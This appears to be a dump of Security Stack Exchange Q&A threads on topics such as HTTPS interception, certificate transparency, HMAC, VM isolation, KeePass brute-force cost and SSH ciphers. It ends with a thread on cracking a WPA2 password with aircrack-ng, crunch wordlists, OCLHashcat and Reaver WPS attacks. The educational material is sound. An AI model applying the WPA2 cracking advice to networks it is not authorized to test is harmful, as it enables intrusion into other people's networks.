<p>Seeing references to that domain is <em>definitely</em> not inherently malicious, however given that you can store just about any file in S3 there's no guarantee that it isn't being used to store some malicious files (among the overwhelmingly legitimate files). AWS credentials are a valuable target for hackers so it's possible the owner of the account has been compromised.</p>

<p>Chrome and Comodo may know that attributes such as the size, checksum, name, etc. of the file match that of known malware which is why they're blocking it (rather than necessarily because it's served from <code>s3.amazonaws.com</code>).</p>

<p>I'd recommend reporting it via the <a href=""http://portal.aws.amazon.com/gp/aws/html-forms-controller/contactus/AWSAbuse#other_abuse"">AWS abuse form</a> or by emailing <code>abuse@amazonaws.com</code>. If it is malware then they'll most likely remove it and contact the account owner. AWS is usually <em>extremely</em> proactive about security issues.</p>
","85266"
"Getting spam calls from numbers similar to my own","118334","","<p>My phone number is 456-123-XXXX (American phone number + area code).  Over the past few months I get fairly regular spam calls from other numbers also beginning with 456-123-XXXX, where the last four digits are always different.  The calls are clearly spam, telling me I won a trip and then asking for my credit card number.  After getting one such call, I ignored it and called the number back.  The guy that answered seemed genuinely confused and said he hadn't called me.  I warned him that his number was likely being used for spam.  I've already called my carrier, but the operator who answered seemed totally confused and basically just suggested I change my number, which I really don't want to do.  My number is attached to a cell phone, although when I originally got it 15 years ago it was a landline.</p>

<p>So... what do I do?  Also, I'm curious as to what's actually happening... as well as if my number is also being used to spam other people.</p>
","<p>The telephone system has been designed so that a caller can replace their phone number with a fake, and some unscrupulous companies use this to change their number to appear to be local to the person they are calling. They aren't using specific numbers of people you know, just something picked at random. The thinking is that a person is more likely to pick up if they think it's a local call. </p>

<p>It is illegal to spoof your number with intent to defraud in the US and Canada, so what they are doing is probably against the law. You could report this to the phone company and they may look into it. Other than that you can't do much about this unless your phone company offers an add-on service to prevent it. </p>
","113129"
"If I use a VPN, who will resolve my DNS requests?","118308","","<p>Will they be resolved by my VPN provider, or by my original ISP (if left on ""automatic"" settings)? Would I have to manually configure a dns server, to make sure my requests will not be resolved by my ISP (constituting a privacy risk)?</p>
","<p>The requests will be passed to the IP that's configured. So if your DNS is still your ISP's DNS, then yes you will still be asking your ISP to resolve a domain name for you. </p>
","13902"
"How secure is TeamViewer for simple remote support?","116916","","<p>I'm deploying a web-based ERP system for a customer, such that both the server and the client machines will be inside the customer's intranet. I was advised in <a href=""https://security.stackexchange.com/q/11207/6939"">another question</a> not to use TeamViewer to access the server, using more secure means instead, and so did I. But now I'm concerned about whether or not TeamViewer would be appropriate for the client machines, which are not ""special"" to this system in particular, but nonetheless I don't want to lower their current security, neither I want to compromise the computer on my end.</p>

<p>My question, then, is whether or not TeamViewer is ""good enough"" for simple remote desktop support, where it will be used simply to assist the users in the usage of the system, and whether or not I must take additional measures (like changing the default settings, changing the firewall, etc) to reach a satisfactory level or security.</p>

<p>Some details:</p>

<ol>
<li><p>I already read the company's <a href=""http://www.teamviewer.com/images/pdf/TeamViewer_SecurityStatement.pdf"" rel=""nofollow noreferrer"">security statement</a> and in my non-expert opinion all's fine. However, <a href=""https://security.stackexchange.com/a/11211/6939"">this answer</a> in that other question has put me in doubt. After some research, UPnP in particular does not worry me anymore, since the feature that uses it - DirectIn - is disabled by default. But I wonder if there are more things I should be aware of that's not covered in that document.</p></li>
<li><p>The Wikipedia <a href=""http://en.wikipedia.org/wiki/Teamviewer#Linux_port"" rel=""nofollow noreferrer"">article</a> about TeamViewer says the Linux port uses Wine. AFAIK that doesn't affect it's network security, is that correct?</p></li>
<li><p>Ultimatly, the responsibility of securing my customers' networks is not mine, it's theirs. But I need to advise them about the possibilities of setting up this system, in particular because most of them are small-medium NGOs without any IT staff of their own. Often I won't be able to offer an ""ideal"" setup, but at least I wanna be able to give advice like: ""if you're installing TeamViewer in this machine, you won't be able to do X, Y and Z in it, because I'll disable it""; or: ""you can install TeamViewer in any regular machine you want, it's safe in its default configuration; only this one *points to server* is off-limits"".</p></li>
<li><p>My choice of TeamViewer was solely because it was straightforward to install in both Windows and Linux machines, and it just works (its cost is accessible too). But I'm open for other suggestions. I'm low both in budget and specialized staff, so I'm going for the simpler tools, but I wanna make a conscious decision whatever that is.</p></li>
</ol>
","<p>There's a couple of differences between using a 3rd party supplier (such as teamviewer) and a direct remote control solution (eg, VNC)</p>

<p>Team Viewer has advantages in that it doesn't require ports to be opened on the firewall for inbound connections, which removes a potential point of attack.  For example if you have something like VNC listening (and it isn't possible to restrict source IP addresses for connections) then if there is a security vulnerability in VNC, or a weak password is used, then there is a risk that an attacker could use this mechanism to attack your customer.</p>

<p>However there is a trade-off for this, which is that you're providing a level of trust to the people who create and run the service (in this case teamviewer).  If their product or servers are compromised, then it's possible that an attacker would be able to use that to attack anyone using the service. One thing to consider is that if you're a paying customer of the service, you may have some contractual come-back if they're hacked (although that's very likely to depend on the service in question and a whole load of other factors)</p>

<p>Like everything in security it's a trade-off.  If you have a decently secure remote control product and manage and control it well then I'd be inclined to say that that's likely to be a more secure option than relying on a 3rd party of any kind.  </p>

<p>That said if the claims on TeamViewers website are accurate it seems likely that they're paying a fair degree of attention to security, and also you could consider that if someone hacks TeamViewer (who have a pretty large number of customers) what's the chance that they'll attack you :)</p>
","12246"
"Does https prevent man in the middle attacks by proxy server?","116905","","<p>There is a desktop client A connecting to website W in a https connection</p>

<pre><code>A --&gt; W
</code></pre>

<p>Somehow between A and W, there is a proxy G.</p>

<pre><code>A --&gt; G --&gt; W
</code></pre>

<ul>
<li>In this case, will G be able to get the certificate which A
previously got from W?</li>
<li>If G can get the certificate, does that mean that G will be able to decrypt the data?</li>
</ul>
","<h2>How does HTTPS work?</h2>

<p>HTTPS is based on <strong>public/private-key cryptography</strong>. This basically means that there is a key pair: The public key is used for encryption and the secret private key is required for decryption.</p>

<p>A <strong>certificate</strong> is basically a public key with a label identifying the owner.</p>

<p>So when your browser connects to an HTTPS server, the server will answer with its certificate. The browser <strong>checks if the certificate is valid</strong>:</p>

<ul>
<li>the owner information need to match the server name that the user requested.</li>
<li>the certificate needs to be signed by a trusted certification authority.</li>
</ul>

<p>If one of these conditions is not met, the user is informed about the problem.</p>

<p>After the verification, the <strong>browser extracts the public key</strong> and uses it to encrypt some information before sending it to the server. The server can decrypt it because the <strong>server has the matching private key</strong>.</p>

<h2>How does HTTPS prevent man in the middle attacks?</h2>

<blockquote>
  <p>In this case, will G be able to get the certificate which A previously got from W?</p>
</blockquote>

<p>Yes, the certificate is the public key with the label. The webserver will send it to anyone who connects to it.</p>

<blockquote>
  <p>If G can get the certificate, does that mean that G will be able to decrypt the data?</p>
</blockquote>

<p>No. The certificate contains the <strong>public key of the webserver</strong>. The malicious proxy is not in the possession of the matching private key. So if the proxy forwards the real certificate to the client, it cannot decrypt information the client sends to the webserver.</p>

<p>The proxy server may try to forge the certificate and provide his own public key instead. This will, however, <strong>destroy the signature of the certification authorities</strong>. The browser will warn about the invalid certificate.</p>

<h2>Is there a way a proxy server can read HTTPS?</h2>

<p>If the <strong>administrator of your computer cooperates</strong>, it is possible for a proxy server to sniff https connections. This is used in some companies in order to scan for viruses and to enforce guidelines of acceptable use.</p>

<p>A <strong>local certification authority</strong> is setup and the administrator tells your browser that this <strong>CA is trustworthy</strong>. The proxy server uses this CA to sign his forged certificates.</p>

<p>Oh and of course, user tend to click security warnings away.</p>
","8309"
"What exactly does it mean when Chrome reports 'no certificate transparency information was supplied by the server?'","114110","","<p>When visiting Gmail in Chrome, if I click on the lock icon in the address bar and go to the connection tab, I receive a message 'no certificate transparency information was supplied by the server' (before Chrome 45, the message was displayed as 'the identity of this website has been verified by Google Internet Authority G2 but does not have public audit records').</p>

<p>What exactly does it mean that the certificate does not have public audit records?  Are their certain threats a site using a certificate without public audit records has that a site using a certificate with public audit records does not?</p>

<p><a href=""https://i.stack.imgur.com/Rn3dW.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/Rn3dW.png"" alt=""Examples of the message as of Chrome 45 and before Chrome 45""></a></p>
","<p><strong><em>Note</strong>: If you're here because your certificate isn't trusted by Chrome, this is not the reason. Chrome will still trust certificates without CT information. If your certificate isn't trusted, there is an additional factor that you may have missed.</em></p>

<p><img src=""https://i.stack.imgur.com/lwIwk.png"" alt=""Comparison of auditable versus no audit record""></p>

<p>This has to do with the concept of <a href=""http://www.certificate-transparency.org/what-is-ct"" rel=""noreferrer"">Certificate Transparency</a>. </p>

<h1>The Problem</h1>

<p>Browsers currently trust certificates if four conditions are met: (a) the certificate is signed by a trusted CA, (b) the current time is within the valid period of the certificate and signing certs (between the <code>notBefore</code> and <code>notAfter</code> times), (c) neither the certificate nor any signing certificate has been revoked, and finally, (d) the certificate matches the domain name of the desired URL.</p>

<p>But these rules leave the door open to abuse. A trusted CA can still issue certificates to people who shouldn't have them. This includes compromised CAs (like <a href=""http://en.wikipedia.org/wiki/DigiNotar"" rel=""noreferrer"">DigiNotar</a>) and also CAs like <a href=""http://www.theregister.co.uk/2012/02/14/trustwave_analysis/"" rel=""noreferrer"">Trustwave</a> who issued at least one intermediate signing certificate for use in performing man-in-the-middle interception of SSL traffic. A curated history of CA failures can be found at CAcert's <a href=""http://wiki.cacert.org/Risk/History"" rel=""noreferrer"">History of Risks &amp; Threat Events to CAs and PKI</a>.</p>

<p>A key problem here is that CAs issue these certificates in secret. You won't know that Trustwave or DigiNotar has issued a fraudulent certificate until you actually <em>see</em> the certificate, in which case you're probably the perpetrator's target, not someone who can actually do any real auditing.  In order prevent abuse or mistakes, we need CAs to make the history of certificates they sign <em>public</em>. </p>

<h1>The Solution</h1>

<p>The way we deal with this is to create a log of issued certificates. This can be maintained by the issuer or it can be maintained by someone else. But the important point is that (a) the log can't be edited, you can only <em>append</em> new entries, and (b) the <em>time</em> that a certificate is added to the log is verified through proper timestamping. Everything is, of course, cryptographically assured to prevent tampering, and the public can watch the contents of the log looking to see if a certificate is issued for a domain they know it shouldn't have.</p>

<p>If your browser then sees a certificate that <em>should be</em> in the log but isn't, or that is in the log but something doesn't match (e.g. the wrong timestamp, etc), then the browser can take appropriate action.</p>

<p>What you're looking at in Chrome, then, is an indication as to whether a publicly audible log exists for the certificate you're looking at. If it does, Chrome can also check to see whether the appropriate log entry has been made and when.</p>

<h1>How widely is it used?</h1>

<p>Google maintains a list of ""known logs"" <a href=""http://www.certificate-transparency.org/known-logs"" rel=""noreferrer"">on their site</a>. As of this writing, there are logs maintained by Google, Digicert, Izenpe, and Certly, each of which can maintain the audit trail for any number of CAs.</p>

<p>The Chrome team <a href=""http://www.certificate-transparency.org/ev-ct-plan"" rel=""noreferrer"">has indicated</a> that EV certificates issued after 1 Jan 2015 must all have a public audit trail to be considered EV. And after the experience gained dealing with EV certificate audit logs has been applied, they'll continue the rollout to all certificate issuers.</p>

<h1>How to check the logs</h1>

<p>Google added a Certificate Transparency lookup form to their standard Transparency Report, which means you can now query for the domains you care about to see which certificates for those domains show up in the transparency logs. This allows you to see, for example, which certificates out there are currently valid for your domain, assuming the CAs cooperate.</p>

<p>Look for it here: <a href=""https://www.google.com/transparencyreport/https/ct/"" rel=""noreferrer"">https://www.google.com/transparencyreport/https/ct/</a></p>

<p>Remember that if you want to <em>track</em> a given domain name to be alerted when a certificate is updated, then you should follow the logs directly. This form is useful for doing point-in-time queries, not for generating alerts.</p>
","52838"
"Converting keys between openssl and openssh","112691","","<p>If I use the following</p>

<pre><code>openssl req -x509  -days 365 -newkey rsa:2048 -keyout private.pem -out public.pem -nodes
</code></pre>

<p>I get <code>private.pem</code> and <code>public.pem</code></p>

<p>If I use </p>

<pre><code>ssh-keygen -t rsa -f rsa
</code></pre>

<p>I get <code>rsa</code> and <code>rsa.pub</code></p>

<p>Is it possible to convert from the format of <code>rsa</code> to <code>private.pem</code> and vice-a-versa?</p>

<p>Edit:  To be more specific,  </p>

<p>a) If I have the <code>private.pem</code> and <code>public.pem</code> generated by the above command, how do I get the equivalent rsa private key and public key?</p>

<p>b)  Given the <code>rsa</code> and <code>rsa.pub</code>, how do I get the x509 keys if I do know the additional metadata that the above openssl command takes in?</p>

<p>If I go from the openssh format to x509 and back, I should ideally get the same key file back.</p>
","<p>You are missing a bit here.</p>

<p><code>ssh-keygen</code> can be used to convert public keys from SSH formats in to PEM formats suitable for OpenSSL. Private keys are normally already stored in a PEM format suitable for both.</p>

<p>However, the OpenSSL command you show generates a self-signed <strong>certificate</strong>. This certificate is not something OpenSSH traditionally uses for anything - and it definitely is not the same thing as a public key only.</p>

<p>OpenSSH does have support for certificates as well, but it is likely that you are not using this support. Also, these certificates are not X.509, so they are incompatible with OpenSSL.</p>

<p>The certificate contains information that is not present anywhere else and each certificate is unique and can not be recreated at will. This means that you need to store the X.509 certificate, in addition to the private key, if you wish use the same key for both OpenSSL and OpenSSH.</p>

<hr>

<p>If you just want to share the private key, the OpenSSL key generated by your example command is stored in <code>private.pem</code>, and it should already be in PEM format compatible with (recent) OpenSSH. To extract an OpenSSH compatible public key from it, you can just run:</p>

<pre><code>ssh-keygen -f private.pem -y &gt; private.pub
</code></pre>

<hr>

<p>If you want to start from OpenSSH and work your way over to the OpenSSL side, with a self-signed certificate (for whatever reason), here's how:</p>

<pre><code>$ ssh-keygen -f test-user
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in test-user.
Your public key has been saved in test-user.pub.
The key fingerprint is:
ff:36:f1:74:c7:0d:4e:da:79:5c:96:27:2c:2c:4e:b6 naked@tink
The key's randomart image is:
+--[ RSA 2048]----+
|                 |
|                 |
|           . .  .|
|          + o =.+|
|        S+ o * B+|
|         .E o = B|
|          .  + o.|
|           .o .  |
|           ...   |
+-----------------+
$ openssl req -x509 -days 365 -new -key test-user -out test-user-cert.pem
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
$ ls -l test-user*
-rw------- 1 naked naked 1675 Mar 18 21:52 test-user
-rw-r--r-- 1 naked naked 1229 Mar 18 21:53 test-user-cert.pem
-rw-r--r-- 1 naked naked  392 Mar 18 21:52 test-user.pub
</code></pre>

<p>From these, both <code>test-user</code> and <code>test-user-cert.pem</code> files are critical to preserve, where as <code>test-user.pub</code> can always be recreated from test-user as needed.</p>
","32774"
"How and when do I use HMAC?","111942","","<p>I was reading <a href=""http://en.wikipedia.org/wiki/HMAC#Design_principles"">HMAC on wikipedia</a> and I was confused about a few points.</p>

<ol>
<li>Where do I use HMAC?</li>
<li>Why is the key part of the hash?</li>
<li>Even if someone successfully used a ""length-extension attack"", how would that be useful to the attacker?</li>
</ol>
","<p>A <a href=""http://en.wikipedia.org/wiki/Message_authentication_code"" rel=""noreferrer"">message authentication code (MAC)</a> is produced from a message and a secret key by a MAC algorithm. An important property of a MAC is that it is impossible¹ to produce the MAC of a message and a secret key without knowing the secret key. A MAC of the same message produced by a different key looks unrelated. Even knowing the MAC of other messages does not help in computing the MAC of a new message.</p>

<p>An <a href=""http://en.wikipedia.org/wiki/Hash-based_message_authentication_code"" rel=""noreferrer"">HMAC</a> is a MAC which is based on a <a href=""http://en.wikipedia.org/wiki/Cryptographic_hash_function"" rel=""noreferrer"">hash function</a>. The basic idea is to concatenate the key and the message, and hash them together. Since it is impossible, given a cryptographic hash, to find out what it is the hash of, knowing the hash (or even a collection of such hashes) does not make it possible to find the key. The basic idea doesn't quite work out, in part because of <a href=""http://en.wikipedia.org/wiki/Length_extension_attack"" rel=""noreferrer"">length extension attacks</a>, so the actual HMAC construction is a little more complicated. For more information, browse the <a href=""https://crypto.stackexchange.com/tags/hmac"">hmac tag on Cryptography Stack Exchange</a>, especially <a href=""https://crypto.stackexchange.com/questions/1070/why-is-hkx-not-a-secure-mac-construction"">Why is H(k||x) not a secure MAC construction?</a>, <a href=""https://crypto.stackexchange.com/questions/1186/is-hklengthx-a-secure-mac-construction"">Is H(k||length||x) a secure MAC construction?</a> and <a href=""https://crypto.stackexchange.com/questions/2936/hmac-vs-mac-functions"">HMAC vs MAC functions</a>. There are other ways to define a MAC, for example MAC algorithms based on block ciphers such as <a href=""http://en.wikipedia.org/wiki/CMAC"" rel=""noreferrer"">CMAC</a>.</p>

<p>A MAC <strong>authenticates</strong> a message. If Alice sees a message and a MAC and knows the associated secret key, she can verify that the MAC was produced by a principal that knows the key by doing the MAC computation herself. Therefore, if a message comes with a correct MAC attached, it means this message was seen by a holder of the secret key at some point. A MAC is a <strong>signature</strong> based on a secret key, providing similar assurances to a signature scheme based on public-key cryptography such as RSA-based schemes where the signature must have been produced by a principal in possession of the private key.</p>

<p>For example, suppose Alice keeps her secret key to herself and only ever uses it to compute MACs of messages that she stores on a cloud server or other unreliable storage media. If she later reads back a message and sees a correct MAC attached to it, she knows that this is one of the messages that she stored in the past.</p>

<p>An HMAC by itself does not provide message integrity. It can be one of the components in a protocol that provides integrity. For example, suppose that Alice stores successive versions of multiple files on an unreliable media, together with their MACs. (Again we assume that only Alice knows the secret key.) If she reads back a file with a correct MAC, she knows that what she read back is some previous version of some file she stored. An attacker in control of the storage media could still return older versions of the file, or a different file. One possible way to provide storage integrity in this scenario would be to include the file name and a version number as part of the data whose MAC is computed; Alice would need to remember the latest version number of each file so as to verify that she is not given stale data. Another way to ensure integrity would be for Alice to remember the MAC of each file (but then a hash would do just as well in this particular scenario).</p>

<p>¹ <sub> “Impossible” as in requiring far more computing power than realistically possible. </sub>  </p>
","20301"
"How secure are virtual machines really? False sense of security?","111162","","<p>I was reading this <a href=""http://rads.stackoverflow.com/amzn/click/0789747138"">CompTIA Security+ SYO-201 book</a>, and the author David Prowse claims that:</p>

<blockquote>
  <p>Whichever VM you select, the VM cannot cross the software boundaries set in
  place. For example, a virus might infect a computer when executed and spread to
  other files in the OS. However, a virus executed in a VM will spread through the
  VM but not affect the underlying actual OS.</p>
</blockquote>

<p>So if I'm running VMWare player and execute some malware on my virtual machine's OS, I don't have to worry about my host system being compromised, at <em>all</em>? </p>

<p>What if the virtual machine shares the network with the host machine, and shared folders are enabled? </p>

<p>Isn't it still possible for a worm to copy itself to the host machine that way? Isn't the user still vulnerable to AutoRun if the OS is Windows and they insert a USB storage device? </p>

<p>How secure are virtual machines, really? How much do they protect the host machine from malware and attacks?</p>
","<p>VM's can definitely cross over.  Usually you have them networked, so any malware with a network component (i.e. worms) will propagate to wherever their addressing/routing allows them to.  Regular viruses tend to only operate in usermode, so while they couldn't communicate overtly, they could still set up a covert channel.  If you are sharing CPU's, a busy process on one VM can effectively communicate state to another VM (that's your prototypical timing covert channel).  Storage covert channel would be a bit harder as the virtual disks tend to have a hard limit on them, so unless you have a system that can over-commit disk space, it should not be an issue.</p>

<p>The most interesting approach to securing VM's is called the <a href=""http://en.wikipedia.org/wiki/Separation_kernel"">Separation Kernel</a>.  It's a result of John Rushby's <a href=""http://www.csl.sri.com/users/rushby/papers/sosp81.pdf"">1981 paper</a> which basically states that in order to have VM's isolated in a manner that could be equivalent to physical separation, the computer must export its resources to specific VM's in a way where at no point any resource that can store state is shared between VM's.  This has deep consequences, as it requires the underlying computer architecture to be designed in a way in which this can be carried out in a non-bypassable manner.  </p>

<p>30yrs after this paper, we finally have few products that claim to do it.  x86 isn't the greatest platform for it, as there are many instructions that cannot be virtualized, to fully support the 'no sharing' idea.  It is also not very practical for common systems, as to have four VM's, you'd need four harddrives hanging off four disk controllers, four video cards, four USB controllers with four mice, etc..</p>
","3058"
"Can a SIM card be tracked without cell phone and battery?","110417","","<p>I have a SIM card alone without cell phone and battery. Can it be be tracked?</p>
","<p>The SIM card must be plugged into a device for it to be functional in any way. It does not contain a power supply or an antenna. As such, it'd be impossible to track a SIM card on its own.</p>

<p>However, once you plug it into a phone and power it on, the IMEI number of the phone and the SIM's serial number will be transmitted to the nearest cell tower(s).</p>
","18943"
"How difficult to crack keepass master password?","108539","","<p>How easily could someone crack my <a href=""http://keepass.info/"">keepass</a> .kdbx file if that person steals the file but never obtains the Master Password?  </p>

<p>Is this a serious threat, or would a brute force attack require massive computing time?  </p>

<p>Assume a password more than 10 characters long with randomly distributed characters of the set including all letters, numbers and most non-alphanumeric keyboard symbols.</p>
","<p>KeePass uses a custom password derivation process which includes multiple iterations of symmetric encryption with a random key (which then serves as salt), as explained <a href=""http://keepass.info/help/base/security.html#secdictprotect"">there</a>. The default number of iterations is 6000, so that's 12000 AES invocations for processing one password (encryption is done on a 256-bit value, AES uses 128-bit blocks, so there must be two AES invocations at least for each round). With a quad-core <em>recent</em> PC (those with the spiffy <a href=""http://en.wikipedia.org/wiki/AES_instruction_set"">AES instructions</a>), you should be able to test about 32000 potential passwords per second.</p>

<p>With ten random characters chosen uniformly among the hundred-of-so of characters which can be typed on a keyboard, there are 10<sup>20</sup> potential passwords, and brute force will, on average, try half of them. You're in for 10<sup>20</sup>*0.5/32000 seconds, also known as 50 million years. But with <em>two</em> PC that's only 25 million years.</p>

<p>This assumes that the password derivation process is not flawed in some way. In ""custom password derivation process"", the ""custom"" is a scary word. Also, the number of iterations is configurable (6000 is only the default value).</p>
","8477"
"OpenSSH default/preferred ciphers, hash, etc for SSH2","108502","","<p>When using OpenSSH server (<code>sshd</code>) and client (<code>ssh</code>), what are all of the default / program preferred ciphers, hash, etc. (security related) and their default options (such as key length)?</p>

<p>So, what are the defaults for symmetric key, MAC, key exchange, etc.</p>
","<p>The default algorithms (that is, the algorithms which the client and server <em>prefer</em> to use when given the choice) depend on the client and server implementations, how they were compiled and configured. So it may depend on the software vendor, software version, operating system distribution, and sysadmin choices.</p>

<p>On an Ubuntu 12.10, <code>man ssh_config</code> indicates that the default order for encryption is:</p>

<pre><code>            aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,
            aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,aes192-cbc,
            aes256-cbc,arcfour
</code></pre>

<p>while the default order for MAC (integrity) is:</p>

<pre><code>            hmac-md5,hmac-sha1,umac-64@openssh.com,
            hmac-ripemd160,hmac-sha1-96,hmac-md5-96,
            hmac-sha2-256,hmac-sha2-256-96,hmac-sha2-512,
            hmac-sha2-512-96
</code></pre>

<p>The key exchange algorithm would follow this order of preference:</p>

<pre><code>            ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,
            diffie-hellman-group-exchange-sha256,
            diffie-hellman-group-exchange-sha1,
            diffie-hellman-group14-sha1,
            diffie-hellman-group1-sha1
</code></pre>

<p>Of course, preferences are subject to negotiation. An algorithm will be selected only if both the client and server support it (in particular, ECDH key exchange support is rather recent), and both client and server have their say in it (if they do not have the exact same preferences).</p>

<p><strong>A survey</strong> is theoretically doable: connect to random IP address, and, if a SSH server responds, work out its preferred list of ciphers and MAC (by connecting multiple times, restricting the list of choices announced by the client). <a href=""http://www.openssh.org/usage/index.html"">OpenSSH makes usage surveys</a> but they are not as thorough (they just want the server ""banner"").</p>
","26074"
"Certificate based authentication vs Username and Password authentication","106451","","<p>What are the advantages and drawbacks of the certificate based authentication over username and password authentication?
I know some, but I would appreciate a structured and detailed answer.</p>

<p><strong>UPDATE</strong></p>

<p>I am interested as well in knowing what attacks are they prone to, e.g. as so far mentioned brute force, while nothing is mentioned for certificates... what about XSRF? A certificate is expected to have shorter lifetime and be able to be revoked while a password would live longer before an admin policy ask to change it... </p>
","<p><strong>1. Users are dumb</strong></p>

<p>A password is something that fits in the memory of a user, and the user chooses it. Since authentication is about verifying the user physical identity <em>remotely</em> (from the point of view of the verifier), the user behavior is necessarily involved in the process -- however, passwords rely on the part of the user which is most notoriously mediocre at handling security, namely his brain. Users simply do not grasp what password entropy is about. I am not <em>blaming</em> them for that: this is a technical subject, a specialization, which cannot realistically become ""common sense"" any time soon. On the other hand, security of a physical token is much more ""tangible"" and average users can become quite good at it. Evolutionists would tell that humans have been positively selected for that for the last million years, because those who could not hold to their flint tools did not survive enough to have offspring.</p>

<p>Hollywood movies can be used as a model of how users think about passwords -- if only because those users go to movies, too. Invariably, the Arch Enemy has a short password and just loves to brag about it and distributes clues whenever he can. And, invariably, a British Secret Agent guesses the password in time to deactivate the fusion bomb which was planted under the Queen's favorite flower bed. Movies project a distorted, exaggerated reality, but they still represent the mental baseline on which average users operate: they envision passwords as providing security through being more ""witty"" than the attacker. And, invariably, most fail at it.</p>

<p>""Password strength"" can be somewhat improved by mandatory rules (at least eight characters, at least two digits, at least one uppercase and one lowercase letter...) but those rules are seen as a burden by the users, and sometimes as an insufferable constraint on their innate freedom -- so the users become to fight the rules, with great creativity, beginning with the traditional writing down of password on a stick-up note. More often than not, password strengthening rules backfire that way.</p>

<p>On the other hand, user certificates imply a storage system, and if that system is a physical device that the user carries around with his house or car keys, then security relies (in part) on how well the average user manages the security of a physical object, and they usually do a good job at it. At least better than when it comes to choosing good password. So that's a big advantage of certificates.</p>

<p><strong>2. Certificates use asymmetric cryptography</strong></p>

<p>The ""asymmetry"" is about separating roles. With a password, whoever verifies the password knows at some point the password or a password-equivalent data (well, that's not entirely true in the case of <a href=""http://en.wikipedia.org/wiki/Password-authenticated_key_agreement"">PAKE</a> protocols). With user certificates, the certificate is <em>issued</em> by a certification authority, who guarantees the link between a physical identity and a cryptographic public key. The verifier may be a <em>distinct</em> entity, and can verify such a link and use it to authenticate the user, <em>without</em> getting the ability to impersonate the user.</p>

<p>In a nutshell, this is the point of certificates: to separate those who <em>define</em> the user digital identity (i.e. the entity which does the mapping from the physical identity to the computer world) from those who <em>authenticate</em> users.</p>

<p>This opens the road to <em>digital signatures</em> which bring non-repudiation. This particularly interests banks which take financial orders from online customers: they need to authenticate customers (that's money we are talking about, a very serious matter) but they would love to have a convincing trace of the orders -- in the sense of: a judge would be convinced. With mere authentication, the bank gains some assurance that it is talking to the right customer, but it cannot prove it to third parties; the bank could build a fake connection transcript, so it is weaponless against a customer who claims to be framed by the bank itself. Digital signatures are not immediately available even if the user has a certificate; but if the user can use a certificate for authentication then most of the hard work has been done.</p>

<p>Also, passwords are inherently vulnerable to phishing attacks, whereas user certificates are not. Precisely because of asymmetry: the certificate usage never involves revealing any secret data to the peer, so an attacker impersonating the server cannot learn anything of value that way.</p>

<p><strong>3. Certificates are complex</strong></p>

<p>Deploying user certificates is complex, thus expensive:</p>

<ul>
<li><p>Issuing and managing certificates is a full can of worm, as any PKI vendor can tell you (and, indeed, I do tell you). Especially the revocation management. PKI is about 5% cryptography and 95% procedures. It <em>can</em> be done, but not cheaply.</p></li>
<li><p>User certificates imply that users store their private key in some way, under their ""exclusive access"". This is done either in software (existing operating systems and/or Web browsers can do that) or using dedicated hardware, but both solutions have their own set of usability issues. The two main problems which will arise are 1) the user loses his key, and 2) an attacker obtains a copy of the key. Software storage makes key loss a plausible issue (at the mercy of a failed hard disk), and sharing the key between several systems (e.g. a desktop computer and an iPad) implies some manual operations which are unlikely to be well protected against attackers. Hardware tokens imply the whole messy business of device drivers, which may be even worse.</p></li>
<li><p>A user certificate implies relatively complex mathematical operations on the client side; this is not a problem for even an anemic Pentium II, but you will not be able to use certificates from some Javascript slapped within a generic Web site. Certificate <em>requires</em> active cooperation from client-side software, and said software tends to be, let's say, ergonomically suboptimal in that matter. Average users can normally learn to use client certificates for a HTTPS connection to a Web site, but at the cost of learning how to ignore the occasional warning popup, which makes them much more vulnerable to some attacks (e.g. active attacks where the attacker tries to feed them its own fake server certificate).</p></li>
</ul>

<p>On the other hand, password-based authentication is really easy to integrate just about everywhere. It is equally easy to mess up, of course; but at least it does not <em>necessarily</em> involve some incompressible extra costs.</p>

<p><strong>Summary</strong></p>

<p>User certificates allow for a separation of roles which passwords cannot do. They do so at the expense of adding a horde of implementation and deployment issues, which make them expensive. However, passwords remain cheap by fitting in a human mind, which inherently implies low security. Security issues with passwords can be somewhat mitigated by some trickeries (up to an including PAKE protocols) and, most of all, by blaming the user in case of a problem (we know the average user cannot choose a secure password, but any mishap will still be his fault -- that's how banks do it).</p>
","3613"
"Bruteforce on 10 characters length WPA2 password","106126","","<p>I'm trying to hack my own <strong>WPA2</strong> network for learning purposes. </p>

<p>I have the <code>*.cap</code> file generated by <code>aircrack-ng</code> tools after a WPA handshake.</p>

<p>I've tested by including my own password and a bunch of incorrect passwords on a wordlist and <code>aircrack-ng</code> crack successfully. My password is 10 characters length, only uppercase letters and numbers, so I tried generating a wordlist with <code>crunch</code> (10 characters length, uppercase and numbers only):</p>

<pre><code>$ crunch 10 10 -f charset.lst ualpha-numeric -o wordlist.txt
</code></pre>

<p>But crunch weight estimation was stunning:</p>

<pre><code>Crunch will now generate the following amount of data: 40217742840692736 bytes
38354628411 MB
37455691 GB
36577 TB
35 PB
Crunch will now generate the following number of lines: 3656158440062976
</code></pre>

<p>The wordlist is incredibly big. And I generated the wordlist by having clues about the lenght and characters involved. If I didn't know that It'd be even bigger.</p>

<p>I guess I know believe that bruteforce attacks on non trivial passwords is impossible, at least with pre generated wordlists.</p>

<p>Is there a way to let <code>aircrack-ng</code> incrementally crack the password with a given length and charset?</p>

<p>What other sane options do I have to attack my password?</p>
","<p>I'd look at OCLHashcat, as it let's you brute force with specific character sets and doesn't need to generate the list beforehand. </p>

<p>I'm not sure what you mean by ""incrementally"" however, if you mean stopping and starting OHC will let you do that. </p>

<p>In terms of cracking WPA2, you've got 3 options. </p>

<ol>
<li>Dictionary attacks</li>
<li>Reaver attack against WPS (most successful option in majority of cases)</li>
<li>Taking a wrench to the person and beating their password out of them</li>
</ol>

<p>Ok, perhaps two options if you're not <em>really</em> wanting that password. </p>

